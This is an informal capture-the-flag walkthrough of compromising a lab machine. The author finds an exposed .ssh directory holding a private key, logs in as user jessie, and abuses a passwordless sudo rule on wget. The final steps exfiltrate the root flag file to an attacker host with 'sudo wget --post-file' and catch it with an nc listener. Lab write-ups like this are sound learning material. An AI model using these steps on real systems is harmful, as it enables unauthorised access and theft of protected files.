@@ -1,0 +1,87 @@
+so this was freking damm! idk what to say! but i fucked up my mind and this wassss sooo easy!
+
+first what i did was rustscan
+Open 10.10.191.163:22
+Open 10.10.191.163:80
+
+
+these two portss were open so what i did was sarted enumerating the port 80 did an nmap scan on it and saw that it was running oudated version of apache
+
+
+i did a gobuster scan on port 80 and saw that there is a dir named /sitemap
+visited that dir and saw that this is a webpage
+started a gobuster scan again on this webpage and got a hell lot of sub directoried
+
+/contact.html         (Status: 200) [Size: 10346]
+/blog.html            (Status: 200) [Size: 12745]
+/index.html           (Status: 200) [Size: 21080]
+/about.html           (Status: 200) [Size: 12232]
+/images               (Status: 301) [Size: 323] [--> http://10.10.191.163/sitemap/images/]
+/services.html        (Status: 200) [Size: 10131]                                         
+/shop.html            (Status: 200) [Size: 17257]                                         
+/css                  (Status: 301) [Size: 320] [--> http://10.10.191.163/sitemap/css/]   
+/work.html            (Status: 200) [Size: 11428]                                         
+/js                   (Status: 301) [Size: 319] [--> http://10.10.191.163/sitemap/js/]  
+
+saw all through these website and havent got anything! though that contact page is vuln as it is taking some input but havent got any thing good from that too! so i visited the main site again! 
+
+
+saw that some part below the "configuration layout for an Apache2 web server installation on Ubuntu systems is as follows”
+is missing so i just visited the source code and this was written there : 
+
+
+ <!-- Jessie don't forget to udate the webiste -->
+ 
+ so from here i got the username so though that might get me into ssh! by bruteforcing into it! but it didnt worked!
+ 
+ i visited the /sitemap again! and tried the medium wordlist scan! still didnt got anything! then tried the big.txt 
+ 
+ and saw these files were there
+ 
+ /.htpasswd            (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htaccess.html       (Status: 403) [Size: 278]
+/.htpasswd.php        (Status: 403) [Size: 278]
+/.htaccess.php        (Status: 403) [Size: 278]
+/.ssh                 (Status: 301) [Size: 321] [--> http://10.10.191.163/sitemap/.ssh/]
+/.htpasswd.txt        (Status: 403) [Size: 278]                                         
+/.htaccess.txt        (Status: 403) [Size: 278]                                         
+/.htpasswd.html       (Status: 403) [Size: 278]                                         
+/about.html           (Status: 200) [Size: 12232]                                       
+/blog.html            (Status: 200) [Size: 12745]                                       
+/contact.html         (Status: 200) [Size: 10346]                                       
+/css                  (Status: 301) [Size: 320] [--> http://10.10.191.163/sitemap/css/] 
+/fonts                (Status: 301) [Size: 322] [--> http://10.10.191.163/sitemap/fonts/]
+/images               (Status: 301) [Size: 323] [--> http://10.10.191.163/sitemap/images/]
+/index.html           (Status: 200) [Size: 21080]                                         
+/js                   (Status: 301) [Size: 319] [--> http://10.10.191.163/sitemap/js/] 
+
+
+aah!! finally! .ssh folder visited there and got the id_rsa file 
+
+now whose ssh key are those???  umm jessie! the user we found earlier
+
+just logged in into the jessie's account
+
+ssh -i id_rsa jessie@ip
+
+and got into the account
+
+did sudo -l
+
+and saw  (root) NOPASSWD: /usr/bin/wget
+
+jessie have this permission visited gtfobins and! 
+
+saw that we can upload any file from the victim pc and download it on the attacker pc like this
+
+LFILE=/root/root_flag.txt
+sudo wget --post-file=$LFILE http://$ip:$port
+
+and on the attacker pc did this
+
+nc -lvnp 4343
+
+you will recive the flag
+
+and completed!
